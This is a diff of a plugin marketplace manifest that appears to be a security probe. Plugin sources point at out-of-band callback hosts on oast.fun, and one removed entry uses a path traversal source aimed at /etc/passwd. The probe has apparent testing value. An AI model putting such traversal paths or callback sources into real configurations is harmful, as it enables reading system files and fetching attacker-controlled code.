@@ -3,9 +3,8 @@
   "owner": {"name": "test"},
   "plugins": [
     {"name": "hello", "source": "./hello", "description": "valid"},
-    {"name": "extgit", "source": {"source": "git", "url": "http://extgit.d8j42hsi7hujvandd2ngc8epk6z3f8ymm.oast.fun/p.git"}, "description": "x"},
-    {"name": "exturl", "source": {"source": "url", "url": "http://exturl.d8j42hsi7hujvandd2ngc8epk6z3f8ymm.oast.fun/u.tar.gz"}, "description": "x"},
-    {"name": "extgh", "source": {"source": "github", "repo": "LiamConner10/cc-mkt-test"}, "description": "x"},
-    {"name": "trav", "source": "../../../../../../../../etc/passwd", "description": "x"}
+    {"name": "urlext", "source": {"source": "url", "url": "https://urlext.d8j42hsi7hujvandd2ngc8epk6z3f8ymm.oast.fun/u.tar.gz"}, "description": "x"},
+    {"name": "gsuba", "source": {"source": "git-subdir", "url": "https://gsuba.d8j42hsi7hujvandd2ngc8epk6z3f8ymm.oast.fun/r.git", "subdirectory": "sub"}, "description": "x"},
+    {"name": "gsubb", "source": {"source": "git-subdir", "repo": "https://gsubb.d8j42hsi7hujvandd2ngc8epk6z3f8ymm.oast.fun/r.git", "path": "sub"}, "description": "x"}
   ]
 }
